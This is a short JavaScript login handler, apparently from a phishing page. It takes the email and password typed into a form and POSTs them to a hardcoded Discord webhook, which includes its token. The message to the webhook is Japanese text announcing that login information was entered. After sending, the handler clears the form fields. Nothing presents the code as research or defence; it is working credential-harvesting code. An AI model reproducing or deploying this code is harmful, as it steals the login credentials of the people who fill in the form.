function logIn() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const webhookUrl =
        "https://discord.com/api/webhooks/1346374011189198900/ia1FrdjNWhf3B1mPV2hlmdrXytQ8ruvwr-g0rvdU1JvQuwtPQpKBBmPwPzM-lslloCXd";
    const data = {
        content: `**ログイン情報が入力されました！**\n\nメールアドレス: \`${email}\`\nパスワード: \`${password}\``
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    }).then(response => {
        if (response.ok) {
            // ログイン情報が送信されたことを示すメッセージを表示
            const message = document.createElement("p");
            message.textContent = "ログイン情報が送信されました！";
            document.querySelector("form").appendChild(message);

            // 入力された情報を削除
            document.getElementById("email").value = "";
            document.getElementById("password").value = "";
        } else {
            throw new Error("ログイン情報の送信に失敗しました。");
        }
    }).catch(error => {
        console.error(error);
    });
}
